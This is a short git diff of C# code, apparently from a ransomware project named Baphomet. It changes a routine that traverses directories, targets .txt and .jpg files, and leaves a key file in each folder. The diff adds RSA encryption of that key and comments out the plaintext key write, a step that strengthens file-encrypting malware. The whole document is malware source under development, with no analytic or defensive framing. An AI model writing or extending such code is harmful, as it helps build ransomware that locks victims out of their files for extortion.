@@ -1,3 +1,4 @@
+using Baphomet.Utilities;
 using System;
 using System.Collections.Generic;
 using System.IO;
@@ -26,9 +27,12 @@ namespace Baphomet
         //recorro los directorios
         public void directoryRoad(string targetPath, string key)
         {
-            var extensionCheck = new[] { ".txt",".jpg" };//Extensiones validas
+            CryptRSA cryptRSA = new CryptRSA();
 
-            File.WriteAllText(targetPath + "\\yourkey.key", key);//escribo la llave en cada uno de los directorios
+            var extensionCheck = new[] { ".txt",".jpg" };//Extensiones validas
+            cryptRSA.EncryptText(targetPath, key);
+
+           // File.WriteAllText(targetPath + "\\yourkey.key", encryptedKey);//escribo la llave en cada uno de los directorios
 
             string[] files = Directory.GetFiles(targetPath);
             string[] subDirs = Directory.GetDirectories(targetPath);
